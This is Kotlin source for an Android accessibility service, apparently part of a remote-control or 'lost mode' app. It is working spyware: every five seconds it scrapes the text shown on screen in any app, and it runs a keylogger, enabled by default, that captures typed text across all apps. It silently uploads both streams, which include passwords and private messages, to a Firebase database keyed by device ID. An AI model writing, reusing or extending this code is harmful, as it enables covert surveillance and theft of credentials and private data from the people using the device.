package com.example.service

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.example.data.sync.LostModeManager
import com.google.firebase.database.FirebaseDatabase
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class RemoteAccessibilityService : AccessibilityService() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var lastScrapedTime = 0L

    private var isKeyloggerActive = staticKeyloggerActive

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        AccessibilityOverlayManager.removeOverlay(this)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        
        val pkgName = event.packageName?.toString() ?: ""
        
        // 1. Lost Mode Check
        if (LostModeManager.isLostModeActive(this)) {
            val eventType = event.eventType
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            ) {
                if (pkgName.isNotEmpty() && pkgName != packageName && !pkgName.contains("inputmethod")) {
                    LostModeManager.launchLostActivity(this)
                }
            }
            return
        }



        // 3. Realtime Screen Text Scraping
        val eventType = event.eventType
        if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
        ) {
            val currentTime = System.currentTimeMillis()
            if (currentTime - lastScrapedTime > 5000) { // Throttle every 5 seconds
                lastScrapedTime = currentTime
                val rootNode = rootInActiveWindow
                if (rootNode != null) {
                    val scrapedTextBuilder = StringBuilder()
                    extractTextFromNode(rootNode, scrapedTextBuilder)
                    val scrapedText = scrapedTextBuilder.toString().trim()
                    if (scrapedText.isNotEmpty()) {
                        syncScrapedTextToFirebase(pkgName, scrapedText)
                    }
                    rootNode.recycle()
                }
            }
        }

        // 4. Keylogger / Keystroke Logging
        if (isKeyloggerActive && event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val textList = event.text
            if (!textList.isNullOrEmpty()) {
                val typedText = textList.joinToString(" ")
                if (typedText.isNotBlank()) {
                    syncKeyloggerToFirebase(pkgName, typedText)
                }
            }
        }
    }

    private fun extractTextFromNode(node: AccessibilityNodeInfo, builder: StringBuilder) {
        try {
            val text = node.text?.toString()
            val contentDesc = node.contentDescription?.toString()
            if (!text.isNullOrBlank()) {
                builder.append(text).append(" ")
            } else if (!contentDesc.isNullOrBlank()) {
                builder.append(contentDesc).append(" ")
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    extractTextFromNode(child, builder)
                    child.recycle()
                }
            }
        } catch (_: Exception) {}
    }

    private fun syncScrapedTextToFirebase(pkgName: String, text: String) {
        serviceScope.launch {
            try {
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN"
                val ref = FirebaseDatabase.getInstance().getReference("devices").child(deviceId).child("screen_text_scraping")
                val record = mapOf(
                    "package" to pkgName,
                    "scraped_text" to text.take(2000),
                    "timestamp" to System.currentTimeMillis()
                )
                ref.setValue(record)
            } catch (_: Exception) {}
        }
    }

    private fun syncKeyloggerToFirebase(pkgName: String, typedText: String) {
        serviceScope.launch {
            try {
                val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN"
                val ref = FirebaseDatabase.getInstance().getReference("devices").child(deviceId).child("keylogger")
                val record = mapOf(
                    "package" to pkgName,
                    "typed_text" to typedText,
                    "timestamp" to System.currentTimeMillis()
                )
                ref.push().setValue(record)
            } catch (_: Exception) {}
        }
    }

    override fun onInterrupt() {
        instance = null
    }

    override fun onUnbind(intent: Intent?): Boolean {
        instance = null
        return super.onUnbind(intent)
    }

    companion object {
        @Volatile
        var instance: RemoteAccessibilityService? = null
            private set

        var staticKeyloggerActive = true

        fun isServiceEnabled(): Boolean {
            return instance != null || AccessibilityOverlayManager.isAccessibilityEnabled(
                com.example.data.sync.RemoteCommandManager.instanceContext ?: return false
            )
        }

        fun performAction(actionId: Int): Boolean {
            val service = instance ?: return false
            return service.performGlobalAction(actionId)
        }

        fun setKeyloggerActive(active: Boolean): Boolean {
            staticKeyloggerActive = active
            instance?.isKeyloggerActive = active
            return true
        }
    }
}
